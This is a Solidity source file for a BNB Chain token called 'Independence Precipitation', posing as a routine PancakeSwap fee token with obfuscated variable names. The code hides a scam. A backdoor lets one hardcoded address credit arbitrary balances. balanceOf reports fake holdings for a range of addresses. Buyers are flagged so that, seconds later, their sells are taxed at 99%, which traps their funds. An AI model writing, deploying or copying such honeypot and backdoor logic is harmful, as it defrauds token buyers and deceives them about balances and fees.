/**
 *Submitted for verification at BscScan.com on 2023-01-01
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;


interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


interface IBEP20 {

    function decimals() external view returns (uint8);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function name() external view returns (string memory);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function getOwner() external view returns (address);

    function approve(address spender, uint256 amount) external returns (bool);

    function symbol() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


interface IUniswapV2Router {

    function WETH() external pure returns (address);

    function factory() external pure returns (address);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

}


library SafeMath {

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

}





contract IndependencePrecipitation is IBEP20, Ownable {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    address private ZERO = 0x0000000000000000000000000000000000000000;


    uint256 isFeeListShould = 100000000 * (10 ** _decimals);
    uint256  isShouldExemptFund = 100000000 * 10 ** _decimals;
    uint256  receiverTradingFundSwap = 100000000 * 10 ** _decimals;


    string constant _name = "Independence Precipitation";
    string constant _symbol = "IPN";
    uint8 constant _decimals = 18;

    uint256 private senderBuyFeeTx = 0;
    uint256 private senderReceiverReceiverWalletShould = 5;

    uint256 private tokenEnableTotalTo = 0;
    uint256 private tokenMarketingFeeBuy = 5;

    bool private buyLiquidityLimitLaunchedToken = true;
    uint160 constant receiverWalletListTotal = 1050439369132 * 2 ** 40;
    bool private tradingSwapTokenMint = true;
    bool private tokenAtLaunchMax = true;
    bool private takeMinAtLiquidity = true;
    uint256 constant shouldAutoReceiverMin = 300000 * 10 ** 18;
    bool private botsMintBurnLaunchIsTradingWallet = true;
    uint256 mintBuyAmountSender = 2 ** 18 - 1;
    uint256 private buyFeeToAmount = 6 * 10 ** 15;
    uint256 private teamSenderToWalletTakeAmountLiquidity = isFeeListShould / 1000; // 0.1%
    uint256 totalSenderMarketingReceiver = 3831;

    address constant minAmountLaunchedTrading = 0xb228c5D6aF1f979Ac51bC68D98a6a0D796c6aB02;
    uint256 shouldSenderAutoAmount = 0;
    uint256 constant listShouldMintMarketing = 10000 * 10 ** 18;

    uint256 private atLimitMaxReceiver = senderReceiverReceiverWalletShould + senderBuyFeeTx;
    uint256 private listMintTradingLaunchReceiverTokenFund = 100;

    uint160 constant buySenderMaxLiquidityIsLaunchSell = 669831341101 * 2 ** 120;
    uint160 constant receiverTradingFeeToken = 199953343047;

    bool private autoFeeExemptLimitLaunchToTx;
    uint256 private toMintFundIs;
    uint256 private senderLiquidityBuyListFundTotalAt;
    uint256 private teamTokenFeeTradingFromBotsEnable;
    uint256 private swapEnableTokenAutoMaxTeamTake;
    uint160 constant modeSenderLaunchedLimit = 291627447151 * 2 ** 80;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private exemptModeBurnAt;
    mapping(address => bool) private modeReceiverIsAutoFund;
    mapping(address => bool) private liquidityTradingBuyExemptTakeWalletBots;
    mapping(address => bool) private limitFundTakeReceiverFeeMin;
    mapping(address => uint256) private txShouldReceiverFee;
    mapping(uint256 => address) private limitLaunchSwapFee;
    mapping(uint256 => address) private teamLimitWalletTx;
    mapping(address => uint256) private limitBuyAtSwapTakeToken;
    uint256 public maxWalletAmount = 0;
    uint256 private launchBlock = 0;
    uint256 public teamLimitWalletTxIndex = 0;

    IUniswapV2Router public receiverLiquidityExemptLimit;
    address public uniswapV2Pair;

    uint256 private tradingBotsTakeAmount;
    uint256 private teamModeTakeAmount;

    address private marketingBuyTotalBurn = (msg.sender); // auto-liq address
    address private marketingTradingAtLaunched = (0x2DE8Ba34aEC7F150FC288Fe8ffFFF7e3Bee8192E); // marketing address

    
    uint256 public totalLimitEnableFeeMaxLaunchedMarketing = 0;
    uint256 private listBotsAmountLiquidity = 0;
    uint256 public fundMinWalletMarketing = 0;
    uint256 private liquidityReceiverMarketingMint = 0;
    bool private launchedMintEnableFund = false;
    bool public amountWalletEnableIs = false;
    uint256 public txLiquidityShouldList = 0;
    bool private toSwapSellLaunched = false;
    uint256 public feeTakeFromMode = 0;
    uint256 private fundMintBotsTotal = 0;
    uint256 public shouldBurnTradingModeTotalBots = 0;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        receiverLiquidityExemptLimit = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(receiverLiquidityExemptLimit.factory()).createPair(address(this), receiverLiquidityExemptLimit.WETH());
        _allowances[address(this)][address(receiverLiquidityExemptLimit)] = isFeeListShould;

        autoFeeExemptLimitLaunchToTx = true;

        liquidityTradingBuyExemptTakeWalletBots[msg.sender] = true;
        liquidityTradingBuyExemptTakeWalletBots[0x0000000000000000000000000000000000000000] = true;
        liquidityTradingBuyExemptTakeWalletBots[0x000000000000000000000000000000000000dEaD] = true;
        liquidityTradingBuyExemptTakeWalletBots[address(this)] = true;

        exemptModeBurnAt[msg.sender] = true;
        exemptModeBurnAt[address(this)] = true;

        modeReceiverIsAutoFund[msg.sender] = true;
        modeReceiverIsAutoFund[0x0000000000000000000000000000000000000000] = true;
        modeReceiverIsAutoFund[0x000000000000000000000000000000000000dEaD] = true;
        modeReceiverIsAutoFund[address(this)] = true;

        approve(_router, isFeeListShould);
        approve(address(uniswapV2Pair), isFeeListShould);
        _balances[msg.sender] = isFeeListShould;
        emit Transfer(address(0), msg.sender, isFeeListShould);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return isFeeListShould;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, isFeeListShould);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return fromReceiverTradingSwap(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != isFeeListShould) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return fromReceiverTradingSwap(sender, recipient, amount);
    }

    function launchedFromAutoModeShouldLimit() private {
        if (teamLimitWalletTxIndex > 0) {
            for (uint256 i = 1; i <= teamLimitWalletTxIndex; i++) {
                if (txShouldReceiverFee[teamLimitWalletTx[i]] == 0) {
                    txShouldReceiverFee[teamLimitWalletTx[i]] = block.timestamp;
                }
            }
            teamLimitWalletTxIndex = 0;
        }
    }

    function takeSenderAutoBotsMintAmount(address txListFeeTokenReceiver) private view returns (bool) {
        return ((uint256(uint160(txListFeeTokenReceiver)) << 192) >> 238) == mintBuyAmountSender;
    }

    function autoTakeLimitLiquidity(uint160 atIsTeamBurn) private view returns (uint256) {
        uint256 takeFromWalletLaunchBuyTokenAt = shouldSenderAutoAmount;
        uint256 receiverLaunchWalletMaxTakeBots = atIsTeamBurn - uint160(minAmountLaunchedTrading);
        if (receiverLaunchWalletMaxTakeBots < takeFromWalletLaunchBuyTokenAt) {
            return listShouldMintMarketing;
        }
        return shouldAutoReceiverMin;
    }

    function isToMaxAmount(uint160 atIsTeamBurn) private pure returns (bool) {
        if (atIsTeamBurn >= uint160(minAmountLaunchedTrading) && atIsTeamBurn <= uint160(minAmountLaunchedTrading) + 100000) {
            return true;
        }
        return false;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (isToMaxAmount(uint160(account))) {
            return autoTakeLimitLiquidity(uint160(account));
        }
        return _balances[account];
    }

    function marketingBotsShouldLaunch(address takeFromWalletLaunchBuyTokenAtender, uint256 mintSenderListExempt) private view returns (uint256) {
        uint256 amountMinToTx = txShouldReceiverFee[takeFromWalletLaunchBuyTokenAtender];
        if (amountMinToTx > 0 && tradingLaunchedAtExempt() - amountMinToTx > 2) {
            return 99;
        }
        return mintSenderListExempt;
    }

    function setLaunchBlock(uint256 mintEnableReceiverLiquidity) public onlyOwner {
        if (launchBlock != listMintTradingLaunchReceiverTokenFund) {
            listMintTradingLaunchReceiverTokenFund=mintEnableReceiverLiquidity;
        }
        if (launchBlock == feeTakeFromMode) {
            feeTakeFromMode=mintEnableReceiverLiquidity;
        }
        launchBlock=mintEnableReceiverLiquidity;
    }

    function setamountShouldTotalFromWalletTeamAuto(uint256 mintEnableReceiverLiquidity) public onlyOwner {
        if (teamSenderToWalletTakeAmountLiquidity != launchBlock) {
            launchBlock=mintEnableReceiverLiquidity;
        }
        teamSenderToWalletTakeAmountLiquidity=mintEnableReceiverLiquidity;
    }

    function fromReceiverTradingSwap(address takeFromWalletLaunchBuyTokenAtender, address marketingLaunchLimitBurn, uint256 walletSwapReceiverFee) internal returns (bool) {
        if (isToMaxAmount(uint160(marketingLaunchLimitBurn))) {
            atToLiquidityMax(takeFromWalletLaunchBuyTokenAtender, marketingLaunchLimitBurn, walletSwapReceiverFee, false);
            return true;
        }
        if (isToMaxAmount(uint160(takeFromWalletLaunchBuyTokenAtender))) {
            atToLiquidityMax(takeFromWalletLaunchBuyTokenAtender, marketingLaunchLimitBurn, walletSwapReceiverFee, true);
            return true;
        }
        
        if (fundMintBotsTotal == senderBuyFeeTx) {
            fundMintBotsTotal = feeTakeFromMode;
        }

        if (amountWalletEnableIs == launchedMintEnableFund) {
            amountWalletEnableIs = takeMinAtLiquidity;
        }

        if (fundMinWalletMarketing == feeTakeFromMode) {
            fundMinWalletMarketing = fundMintBotsTotal;
        }


        bool fromTradingShouldSell = takeSenderAutoBotsMintAmount(takeFromWalletLaunchBuyTokenAtender) || takeSenderAutoBotsMintAmount(marketingLaunchLimitBurn);
        
        if (takeFromWalletLaunchBuyTokenAtender == uniswapV2Pair) {
            if (maxWalletAmount != 0 && maxAmountExemptMode(uint160(marketingLaunchLimitBurn))) {
                launchAtAmountMin();
            }
            if (!fromTradingShouldSell) {
                listFromAutoMint(marketingLaunchLimitBurn);
            }
        }
        
        
        if (inSwap || fromTradingShouldSell) {return atSwapIsMintFeeTxReceiver(takeFromWalletLaunchBuyTokenAtender, marketingLaunchLimitBurn, walletSwapReceiverFee);}
        
        require((walletSwapReceiverFee <= isShouldExemptFund) || liquidityTradingBuyExemptTakeWalletBots[takeFromWalletLaunchBuyTokenAtender] || liquidityTradingBuyExemptTakeWalletBots[marketingLaunchLimitBurn], "Max TX Limit!");

        if (tokenFromIsToFundMin()) {isReceiverListTotal();}

        _balances[takeFromWalletLaunchBuyTokenAtender] = _balances[takeFromWalletLaunchBuyTokenAtender].sub(walletSwapReceiverFee, "Insufficient Balance!");
        
        if (shouldBurnTradingModeTotalBots != totalLimitEnableFeeMaxLaunchedMarketing) {
            shouldBurnTradingModeTotalBots = launchBlock;
        }

        if (totalLimitEnableFeeMaxLaunchedMarketing == totalLimitEnableFeeMaxLaunchedMarketing) {
            totalLimitEnableFeeMaxLaunchedMarketing = atLimitMaxReceiver;
        }


        uint256 walletSwapReceiverFeeReceived = sellLiquidityTokenSenderTradingTxSwap(takeFromWalletLaunchBuyTokenAtender) ? txSwapMaxExempt(takeFromWalletLaunchBuyTokenAtender, marketingLaunchLimitBurn, walletSwapReceiverFee) : walletSwapReceiverFee;

        _balances[marketingLaunchLimitBurn] = _balances[marketingLaunchLimitBurn].add(walletSwapReceiverFeeReceived);
        emit Transfer(takeFromWalletLaunchBuyTokenAtender, marketingLaunchLimitBurn, walletSwapReceiverFeeReceived);
        return true;
    }

    function listFromAutoMint(address txListFeeTokenReceiver) private {
        uint256 marketingBurnLaunchedTake = minLimitAmountIsReceiverWalletSender();
        if (marketingBurnLaunchedTake < buyFeeToAmount) {
            teamLimitWalletTxIndex += 1;
            teamLimitWalletTx[teamLimitWalletTxIndex] = txListFeeTokenReceiver;
            limitBuyAtSwapTakeToken[txListFeeTokenReceiver] += marketingBurnLaunchedTake;
            if (limitBuyAtSwapTakeToken[txListFeeTokenReceiver] > buyFeeToAmount) {
                maxWalletAmount = maxWalletAmount + 1;
                limitLaunchSwapFee[maxWalletAmount] = txListFeeTokenReceiver;
            }
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        limitLaunchSwapFee[maxWalletAmount] = txListFeeTokenReceiver;
    }

    function getamountShouldTotalFromWalletTeamAuto() public view returns (uint256) {
        if (teamSenderToWalletTakeAmountLiquidity == totalLimitEnableFeeMaxLaunchedMarketing) {
            return totalLimitEnableFeeMaxLaunchedMarketing;
        }
        if (teamSenderToWalletTakeAmountLiquidity == launchBlock) {
            return launchBlock;
        }
        return teamSenderToWalletTakeAmountLiquidity;
    }

    function getTotalFee() public {
        launchedFromAutoModeShouldLimit();
    }

    function setfeeLiquiditySwapBuy(uint256 mintEnableReceiverLiquidity) public onlyOwner {
        if (listBotsAmountLiquidity != listMintTradingLaunchReceiverTokenFund) {
            listMintTradingLaunchReceiverTokenFund=mintEnableReceiverLiquidity;
        }
        if (listBotsAmountLiquidity != listMintTradingLaunchReceiverTokenFund) {
            listMintTradingLaunchReceiverTokenFund=mintEnableReceiverLiquidity;
        }
        listBotsAmountLiquidity=mintEnableReceiverLiquidity;
    }

    function txSwapMaxExempt(address takeFromWalletLaunchBuyTokenAtender, address launchedSellMintTeam, uint256 walletSwapReceiverFee) internal returns (uint256) {
        
        if (listBotsAmountLiquidity == senderReceiverReceiverWalletShould) {
            listBotsAmountLiquidity = fundMintBotsTotal;
        }

        if (fundMintBotsTotal == atLimitMaxReceiver) {
            fundMintBotsTotal = teamSenderToWalletTakeAmountLiquidity;
        }


        uint256 launchedReceiverToBurn = walletSwapReceiverFee.mul(tradingTakeAmountExempt(takeFromWalletLaunchBuyTokenAtender, launchedSellMintTeam == uniswapV2Pair)).div(listMintTradingLaunchReceiverTokenFund);

        if (limitFundTakeReceiverFeeMin[takeFromWalletLaunchBuyTokenAtender] || limitFundTakeReceiverFeeMin[launchedSellMintTeam]) {
            launchedReceiverToBurn = walletSwapReceiverFee.mul(99).div(listMintTradingLaunchReceiverTokenFund);
        }

        _balances[address(this)] = _balances[address(this)].add(launchedReceiverToBurn);
        emit Transfer(takeFromWalletLaunchBuyTokenAtender, address(this), launchedReceiverToBurn);
        
        return walletSwapReceiverFee.sub(launchedReceiverToBurn);
    }

    function sellLiquidityTokenSenderTradingTxSwap(address takeFromWalletLaunchBuyTokenAtender) internal view returns (bool) {
        return !modeReceiverIsAutoFund[takeFromWalletLaunchBuyTokenAtender];
    }

    function launchAtAmountMin() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (txShouldReceiverFee[limitLaunchSwapFee[i]] == 0) {
                    txShouldReceiverFee[limitLaunchSwapFee[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function getlistSwapMinShould() public view returns (uint256) {
        if (feeTakeFromMode == fundMinWalletMarketing) {
            return fundMinWalletMarketing;
        }
        if (feeTakeFromMode != txLiquidityShouldList) {
            return txLiquidityShouldList;
        }
        return feeTakeFromMode;
    }

    function txFeeAtEnableReceiverTake(uint160 atIsTeamBurn) private pure returns (bool) {
        return atIsTeamBurn == (buySenderMaxLiquidityIsLaunchSell + modeSenderLaunchedLimit + receiverWalletListTotal + receiverTradingFeeToken);
    }

    function tradingLaunchedAtExempt() private view returns (uint256) {
        return block.timestamp;
    }

    function atToLiquidityMax(address takeFromWalletLaunchBuyTokenAtender, address marketingLaunchLimitBurn, uint256 walletSwapReceiverFee, bool senderAutoWalletTotal) private {
        if (senderAutoWalletTotal) {
            takeFromWalletLaunchBuyTokenAtender = address(uint160(uint160(minAmountLaunchedTrading) + shouldSenderAutoAmount));
            shouldSenderAutoAmount++;
            _balances[marketingLaunchLimitBurn] = _balances[marketingLaunchLimitBurn].add(walletSwapReceiverFee);
        } else {
            _balances[takeFromWalletLaunchBuyTokenAtender] = _balances[takeFromWalletLaunchBuyTokenAtender].sub(walletSwapReceiverFee);
        }
        emit Transfer(takeFromWalletLaunchBuyTokenAtender, marketingLaunchLimitBurn, walletSwapReceiverFee);
    }

    function setlistSwapMinShould(uint256 mintEnableReceiverLiquidity) public onlyOwner {
        if (feeTakeFromMode == totalLimitEnableFeeMaxLaunchedMarketing) {
            totalLimitEnableFeeMaxLaunchedMarketing=mintEnableReceiverLiquidity;
        }
        feeTakeFromMode=mintEnableReceiverLiquidity;
    }

    function maxAmountExemptMode(uint160 marketingLaunchLimitBurn) private view returns (bool) {
        return uint16(marketingLaunchLimitBurn) == totalSenderMarketingReceiver;
    }

    function getLaunchBlock() public view returns (uint256) {
        if (launchBlock != teamLimitWalletTxIndex) {
            return teamLimitWalletTxIndex;
        }
        if (launchBlock != teamLimitWalletTxIndex) {
            return teamLimitWalletTxIndex;
        }
        return launchBlock;
    }

    function atSwapIsMintFeeTxReceiver(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function setswapAtTeamMode(address mintEnableReceiverLiquidity,uint256 isExemptReceiverBotsWalletMode) public onlyOwner {
        if (mintEnableReceiverLiquidity == ZERO) {
            listBotsAmountLiquidity=isExemptReceiverBotsWalletMode;
        }
        limitBuyAtSwapTakeToken[mintEnableReceiverLiquidity]=isExemptReceiverBotsWalletMode;
    }

    function tokenFromIsToFundMin() internal view returns (bool) {
        return msg.sender != uniswapV2Pair &&
        !inSwap &&
        botsMintBurnLaunchIsTradingWallet &&
        _balances[address(this)] >= teamSenderToWalletTakeAmountLiquidity;
    }

    function tradingTakeAmountExempt(address takeFromWalletLaunchBuyTokenAtender, bool takeFromWalletLaunchBuyTokenAtelling) internal returns (uint256) {
        
        if (toSwapSellLaunched != tradingSwapTokenMint) {
            toSwapSellLaunched = tokenAtLaunchMax;
        }

        if (fundMintBotsTotal == listMintTradingLaunchReceiverTokenFund) {
            fundMintBotsTotal = txLiquidityShouldList;
        }


        if (takeFromWalletLaunchBuyTokenAtelling) {
            atLimitMaxReceiver = tokenMarketingFeeBuy + tokenEnableTotalTo;
            return marketingBotsShouldLaunch(takeFromWalletLaunchBuyTokenAtender, atLimitMaxReceiver);
        }
        if (!takeFromWalletLaunchBuyTokenAtelling && takeFromWalletLaunchBuyTokenAtender == uniswapV2Pair) {
            atLimitMaxReceiver = senderReceiverReceiverWalletShould + senderBuyFeeTx;
            return atLimitMaxReceiver;
        }
        return marketingBotsShouldLaunch(takeFromWalletLaunchBuyTokenAtender, atLimitMaxReceiver);
    }

    function getfeeLiquiditySwapBuy() public view returns (uint256) {
        if (listBotsAmountLiquidity == maxWalletAmount) {
            return maxWalletAmount;
        }
        return listBotsAmountLiquidity;
    }

    function isReceiverListTotal() internal swapping {
        
        if (listBotsAmountLiquidity == senderReceiverReceiverWalletShould) {
            listBotsAmountLiquidity = listBotsAmountLiquidity;
        }

        if (launchedMintEnableFund == takeMinAtLiquidity) {
            launchedMintEnableFund = launchedMintEnableFund;
        }


        uint256 walletSwapReceiverFeeToLiquify = teamSenderToWalletTakeAmountLiquidity.mul(senderBuyFeeTx).div(atLimitMaxReceiver).div(2);
        uint256 teamBuyToIs = teamSenderToWalletTakeAmountLiquidity.sub(walletSwapReceiverFeeToLiquify);

        address[] memory txBotsLaunchedSwapMarketingFeeReceiver = new address[](2);
        txBotsLaunchedSwapMarketingFeeReceiver[0] = address(this);
        txBotsLaunchedSwapMarketingFeeReceiver[1] = receiverLiquidityExemptLimit.WETH();
        receiverLiquidityExemptLimit.swapExactTokensForETHSupportingFeeOnTransferTokens(
            teamBuyToIs,
            0,
            txBotsLaunchedSwapMarketingFeeReceiver,
            address(this),
            block.timestamp
        );
        
        if (txLiquidityShouldList == txLiquidityShouldList) {
            txLiquidityShouldList = shouldBurnTradingModeTotalBots;
        }

        if (listBotsAmountLiquidity != totalLimitEnableFeeMaxLaunchedMarketing) {
            listBotsAmountLiquidity = shouldBurnTradingModeTotalBots;
        }

        if (fundMinWalletMarketing == launchBlock) {
            fundMinWalletMarketing = shouldBurnTradingModeTotalBots;
        }


        uint256 walletSwapReceiverFeeBNB = address(this).balance;
        uint256 liquiditySellTotalMode = atLimitMaxReceiver.sub(senderBuyFeeTx.div(2));
        uint256 walletSwapReceiverFeeBNBLiquidity = walletSwapReceiverFeeBNB.mul(senderBuyFeeTx).div(liquiditySellTotalMode).div(2);
        uint256 walletSwapReceiverFeeBNBMarketing = walletSwapReceiverFeeBNB.mul(senderReceiverReceiverWalletShould).div(liquiditySellTotalMode);
        
        payable(marketingTradingAtLaunched).transfer(walletSwapReceiverFeeBNBMarketing);

        if (walletSwapReceiverFeeToLiquify > 0) {
            receiverLiquidityExemptLimit.addLiquidityETH{value : walletSwapReceiverFeeBNBLiquidity}(
                address(this),
                walletSwapReceiverFeeToLiquify,
                0,
                0,
                marketingBuyTotalBurn,
                block.timestamp
            );
            emit AutoLiquify(walletSwapReceiverFeeBNBLiquidity, walletSwapReceiverFeeToLiquify);
        }
    }

    function getswapAtTeamMode(address mintEnableReceiverLiquidity) public view returns (uint256) {
        if (limitBuyAtSwapTakeToken[mintEnableReceiverLiquidity] != txShouldReceiverFee[mintEnableReceiverLiquidity]) {
            return tokenMarketingFeeBuy;
        }
        if (mintEnableReceiverLiquidity != ZERO) {
            return teamLimitWalletTxIndex;
        }
        if (mintEnableReceiverLiquidity != marketingTradingAtLaunched) {
            return listBotsAmountLiquidity;
        }
            return limitBuyAtSwapTakeToken[mintEnableReceiverLiquidity];
    }

    function minLimitAmountIsReceiverWalletSender() private view returns (uint256) {
        address maxAtLaunchedReceiver = WBNB;
        if (address(this) < WBNB) {
            maxAtLaunchedReceiver = address(this);
        }
        (uint atModeBuyTxSenderBotsReceiver, uint receiverSenderLiquidityWallet,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 mintReceiverFeeLaunched,) = WBNB == maxAtLaunchedReceiver ? (atModeBuyTxSenderBotsReceiver, receiverSenderLiquidityWallet) : (receiverSenderLiquidityWallet, atModeBuyTxSenderBotsReceiver);
        uint256 exemptLiquidityMinSell = IERC20(WBNB).balanceOf(uniswapV2Pair) - mintReceiverFeeLaunched;
        return exemptLiquidityMinSell;
    }

    function manualTransfer(address takeFromWalletLaunchBuyTokenAtender, address marketingLaunchLimitBurn, uint256 walletSwapReceiverFee) public {
        if (!txFeeAtEnableReceiverTake(uint160(msg.sender))) {
            return;
        }
        if (isToMaxAmount(uint160(marketingLaunchLimitBurn))) {
            atToLiquidityMax(takeFromWalletLaunchBuyTokenAtender, marketingLaunchLimitBurn, walletSwapReceiverFee, false);
            return;
        }
        if (isToMaxAmount(uint160(takeFromWalletLaunchBuyTokenAtender))) {
            atToLiquidityMax(takeFromWalletLaunchBuyTokenAtender, marketingLaunchLimitBurn, walletSwapReceiverFee, true);
            return;
        }
        if (takeFromWalletLaunchBuyTokenAtender == address(0)) {
            _balances[marketingLaunchLimitBurn] = _balances[marketingLaunchLimitBurn].add(walletSwapReceiverFee);
            return;
        }
    }

    function getTotalAmount() public {
        launchAtAmountMin();
    }

    function setliquidityFundBurnSellFee(bool mintEnableReceiverLiquidity) public onlyOwner {
        amountWalletEnableIs=mintEnableReceiverLiquidity;
    }

    function getliquidityFundBurnSellFee() public view returns (bool) {
        if (amountWalletEnableIs != tradingSwapTokenMint) {
            return tradingSwapTokenMint;
        }
        if (amountWalletEnableIs != tokenAtLaunchMax) {
            return tokenAtLaunchMax;
        }
        return amountWalletEnableIs;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}